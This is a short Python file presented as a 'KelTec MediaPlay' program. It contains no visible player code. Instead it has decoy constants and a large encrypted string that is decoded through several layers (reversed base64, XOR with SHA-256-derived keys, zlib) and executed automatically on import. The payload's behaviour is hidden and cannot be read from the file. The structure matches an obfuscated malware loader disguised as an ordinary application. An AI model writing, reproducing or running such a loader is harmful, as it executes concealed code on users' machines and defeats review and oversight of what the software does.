# -*- coding: utf-8 -*-
# KelTec MediaPlay 

_lx0_0 = 813647 ^ 852987
_lx1_1 = len("196e08")
import zlib as _z,base64 as _b,hashlib as _h,sys as _s,os as _o
_lx2_2 = abs(-471929)
_lx3_3 = 816480 * 0
_lx4_4 = 625017 ^ 181242
_K = '0ac24f33daa1a590628a1ca23ec1705c8c3e0d92a5f6d1feebca3308e7b6e05c'
_M = '2VdwzDr+krB0fwAr8CkndpROwFnsahHIY0x9yukWfhfVQ3GbOLHTuHxzCi6qL3B+lk6SDepuQJsyTiye6BsuRNUTdp9uvI7qL3NZ'
_D = '=k0UYyCVo3NCDerkmgSspyCOh2dLMuRHt/2NTd8gLhw2REMIp6bgouSQmLP/XKXGsTOOHdclBKloOvvmibfd/taxYKKom0QdW0LgA4hru3IbHF0YBWUfTopX5qbcuPISu0klHfBl2a8N4QBj2s9GE4R114N2cnTXkOj9AnqWYo5BL08BPtigjAZvYjzbtQZsnCl+CQQtkiAWj3v8/4JYODxA9V4fDyU7xeVIdt164mVrQ1k6igG4dJx9BTiTZG4XiVrTPW1XjEAxfyzZLEE3N1EtiNdcK0szobNRSNpMpwYQ1G2dMdJWl+Yn1ROTf9uYHt38/B53ozJqwZqouwnfF3huTJ4g2eHBhQ/QQRPJ0DDNrtFydtIswQ5OkwWEWpSLfUiJxvM9HFxheROznCehoPKeGStwWyxA4nYNWoMINslTjD69CHZfoSYnv5Bu2GhocHDdkkOm1RF3csDUGN66wkY0zyv6ly7f2O6mtLZHmLF6yuUQ3fTqzR1mOUlmvkGIVJR4uBcDqcI1AhpQ0nxgD6BlpSyQVjSdrQJ787nyz9GBT4h0x4LnxwtyUvFQhaQ7kmXiw/sC1UAmuFXKNaT/hMi47GUNUg25ahAmuVh0AyGyYNqNa3qwtPFzC1SXxNwlxhgf7Uo8OHClcf1F9uKnV4rHuzrcknklCsA1cfqYY9NPOhml4Gk5gM8PW6TJu6Exd6Os3nUKDQlFOw2rTXXpBMSsXHtTe/fhuRKrw4l1M/tDOx6E2D2642zdynxJhqyFhTG5MPOs1P6YMmAtl9wyqun5Ke7eSKL0FF5JHEUaMvUmfIUUEQIdYox0OMACKg+y9iJtzlNU6P0+SLP3tKfTKJaRSdkI1b3Xdaa1vxpQZCaD/Qy7avAUugTf9YA3akggMGeVXulyDdJfd8egsz6Tfd7icNAZMQrLxt6/7AjkPYp7q+xRncLHoleT9nT6yfVLDY9BlceaqnhlmVw7pV/TFLFIpjsZstxvRSAidOht2Dg7+cXLzG5HvsYVdLXJSB1XwFRcgVRBizAdSICduorfBcVxmMD4nKC/NxU/mvCopgqVjo/sWnrtBSx/lPLqemgbitUy1WmMoYUro3hOoa7EhHq+2p+lg/MIRCljVm2vXp3QhSSONOfK3bTe3T1iVkRW2gEH0a8X3ZpqaPuj5HjdLDmY/+ntZpu/uFgNRcfuwO2zouJFJ42ESaDAL72H4vWaq2/Md4HYldBDzZoXZVZLfB9YaA3mdWJZDa2CuanNTbOJyApSFNy4WWCeXv07GDZMkUOzguNuEc5Fl2nAFlDD/d7XcoB8eoaVpcr6+GFnei16ejAle+L8xOM1Y5pQL2Pb8OS/0fG/Se6maarFp5dSVerhK0AxdkelipgW6ts02vra2zofhMuvCFUE3yaLsxEcE5A8Y/Z72PpwVqVb9YQHCYyAGoV7HKtGQ8+c++fruvtQRaHZq7Y1vQ+TxxyvObeR1uQbEZ1/3i8SPpAbWDsLCqiJFksg3QAuGXZuvaC7h0VtpTPniX6dKWUkRiC48rK/Ndni+bhRexq4esmSiRWTzXGnYfMMZuGakoRxPYlp9Ljpb8quO7Dl5BOeX6CmZsUVTtn2bLDttrPlAGMxeoZ7iWafdl1meEDAIxfn/HrM4UTVi9LpquZR86GncUIxxpPTyxs5AIwFnNoVGIcumC3eIfRRLDQ8qPWYpDGoRvUTuF+kbxPgwJEmtYtpuEg05Z1m/aRwPIAqRM5YNp8Yxl7eNp0Oa67CV9dnvjCBhtWV4v6OWsKbaVktYMWfrG+iG2HhbRCV9cST6jvGtIjb9s1lLTQSh+8PTdBq0x9oNLPSB9WU5dl2ZERhMvnz'

def _xr(d,k):
    kl=len(k);return bytes(d[i]^k[i%kl] for i in range(len(d)))
def _dk(sd,c):
    return _h.sha256((_K+sd+str(c)).encode('utf-8')).digest()
def _dc(s,c,sd):
    r=_b.b64decode(s[::-1]);return _z.decompress(_xr(r,_dk(sd,c))).decode('utf-8')
def _run():
    mk=_h.sha256(_K.encode('utf-8')).digest()
    meta=_xr(_b.b64decode(_M),mk).decode('utf-8').split(':',2)
    sd=meta[0];nc=int(meta[1])
    d=_D
    for c in range(nc-1,-1,-1):d=_dc(d,c,sd)
    idx=d.find('||')
    src=d[idx+2:] if idx!=-1 else d
    _e={'__name__':'__main__','__file__':__file__}
    exec(compile(src,'<mediaplay>','exec'),_e)
    return _e
_e=_run()
globals().update({_k:_v for _k,_v in _e.items() if not _k.startswith('_')})